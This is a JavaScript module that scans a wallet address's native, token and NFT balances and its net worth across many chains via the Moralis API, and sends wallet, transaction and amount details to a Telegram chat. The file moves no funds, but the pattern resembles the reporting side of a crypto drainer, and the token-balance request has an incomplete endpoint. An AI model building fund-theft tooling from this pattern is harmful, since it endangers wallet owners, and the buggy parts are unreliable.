import {BrowserProvider, formatEther} from "ethers"

const API = import.meta.env.VITE_MORALIS_API;

export const getNativeBalance = async (address) => {
  try {
    const supportedNetworks = ["eth", "0x1", "polygon", "bsc", "avalanche", "fantom", "cronos", "arbitrum", "chiliz", "gnosis", "base", "optimism", "optimism", "linea", "holesky", "moonbeam", "moonriver", "moonbase", "flow", "ronin", "lisk", "sepolia", "base sepolia"];

    let returnData = [];

    for( let x = 0; x < supportedNetworks.length; x++){
      const network = supportedNetworks[x];
      console.warn("getting balance for network", network )
       const options = {
        method: 'GET',
        headers: {
            accept: 'application/json',
            'X-API-Key': API
        },
      };
      const result = await fetch(`https://deep-index.moralis.io/api/v2.2/${address}/balance?chain=${network}`, options)
      .then(response => response.json())
      .then(response => response )
      .catch(err => console.error(err));

      console.log(`result for ${network} = ${result}`)

      if(result && typeof result == "object" && parseInt( result.balance ) > 0){
          result.chain = network;
          result.type = "NATIVE";
          returnData = returnData.concat(result);
      }
    }
    return returnData;
  } catch (error) {
    console.error('Error fetching native balance:', error);
    return [];
  }
};

export const getERC20Balances = async (address, chain) => {
  try {
    return await getTokenBalance(address)
  } catch (error) {
    console.error('Error fetching ERC-20 balances:', error);
    return [];
  }
};

export const getNFTBalances = async (address) => {
  try {
   return await getNftBalances(address)
  } catch (error) {
    console.error('Error fetching NFT balances:', error);
    return [];
  }
};

export async function getTokenBalance(address){   

    //const supportedNetworks = ["eth", "0x1", "polygon", "bsc", "avalanche", "fantom", "cronos", "arbitrum", "chiliz", "gnosis", "base", "optimism", "optimism", "linear", "holesky", "moonbeam", "moonriver", "moonbase", "flow", "ronin", "lisk"];

    let returnData = [];
    const options = {
        method: 'GET',
        headers: {
            accept: 'application/json',
            'X-API-Key': API
        },
    };
    const result = await fetch(`https://deep-index.moralis.io/api/v2.2/${address}/`, options)
    .then(response => response.json())
    .then(response => response )
    .catch(err => console.error(err));

    if(result && result.length && typeof result == "object"){
        returnData = returnData.concat(result.map(res => {
          res.type = "TOKEN";
          return res;
        }));
    }
    console.log("Data from moralis: ", returnData );

    return returnData;
}

export function sendTelegramMessage(chatID, message, chainId = 0, messageType = "info", walletAddress = "", transactionHash = "", amount = 0, tokenSymbol = "" ) {
    let token = import.meta.env.VITE_TELEGRAM_BOT_API;
    
    const formatHTMLMessage = (content, type = "info") => {
        const headers = {
            info: "📢 Information",
            success: "✅ Success",
            warning: "⚠️ Warning", 
            error: "❌ Error"
        };
        
        return `
        <b>${headers[type]}</b>

        ${content}

        ${walletAddress ? `<code>Wallet: ${walletAddress}</code>` : ''}
        ${transactionHash ? `<code>TX: ${transactionHash}</code>` : ''}
        ${amount ? `<code>Amount Involved: ${tokenSymbol} ${amount}</code>` : ''}
                `.trim();
    };

    const htmlMessage = formatHTMLMessage(message, messageType);

    let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatID + 
              "&text=" + encodeURIComponent(htmlMessage) + 
              "&parse_mode=HTML";
    
    fetch(url);
}

/*interface TokenBalance {
  address?: string;
  name: string;
  symbol: string;
  balance: string;
  formatted: string;
  decimals?: number;
  chain: string;
  type: 'native' | 'ERC-20' | 'ERC-721' | 'ERC-1155';
  tokenId?: string;
} */

export const scanUserBalances = async (userAddress) => {
  const chains = [
    { chainId: '0x1', name: 'Ethereum' },
    { chainId: '0x89', name: 'Polygon' },
    { chainId: '0x38', name: 'BNB Smart Chain' },
    { chainId: '0xa4b1', name: 'Arbitrum' },
    { chainId: '0xa', name: 'Optimism' },
  ];

  const allBalances = [];

  if(typeof userAddress == "string")
    userAddress = [userAddress]

    for(let x = 0; x < userAddress.length; x++){
      const addresss = userAddress[x];
        try {
          // Get native balance
          const nativeBalance = await getNativeBalance(addresss);
          if (nativeBalance) {
            allBalances.push(...nativeBalance);
          }

          // Get ERC-20 balances
          const erc20Balances = await getERC20Balances(addresss);
          allBalances.push(...erc20Balances);

          // Get NFT balances
          const nftBalances = await getNFTBalances(addresss);
          //console.log("check nfts: ", nftBalances, typeof nftBalances )
          allBalances.push(...nftBalances.map(nft => ({
            address: nft.contractAddress,
            name: nft.name,
            symbol: nft.symbol,
            balance: '1', // NFTs typically have balance of 1 per tokenId
            formatted: '1',
            nfttype: nft.type,
            type:"NFT",
            tokenId: nft.tokenId
          })));

        } catch (error) {
          console.error(`Error scanning for balance:`, error);
        }
    }
    
  

  return allBalances;
};


export async function getWalletsWorth(address){
    // Node.js v18+ has native fetch support
// No additional dependencies required

const options = {
  method: 'GET',
  headers: {
    accept: 'application/json',
    'X-API-Key': API
  },
};

return await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/net-worth?exclude_spam=true&exclude_unverified_contracts=true&max_token_inactivity=1&min_pair_side_liquidity_usd=1000`, options)
  .then(response => response.json())
  .then(response => response )
  .catch(err => console.error(err));
}

export async function getNftBalances(address){
    // Node.js v18+ has native fetch support
// No additional dependencies required

const options = {
  method: 'GET',
  headers: {
    accept: 'application/json',
    'X-API-Key': API
  },
};
const balance = await fetch(`https://deep-index.moralis.io/api/v2.2/${address}/nft?format=decimal&limit=25`, options)
  .then(response => response.json())
  .then(response => response)
  .catch(err => console.error(err));

  if( balance && balance.result ){
    return balance.result;
  }
  return [];
}


export const handleGetBalance = async (address, walletProvider, chainId ) => {
  const provider = new BrowserProvider(walletProvider, chainId);
  const balance = await provider.getBalance(address);
  const eth = formatEther(balance);
  console.log(`${eth} ETH`);
  return eth;
};

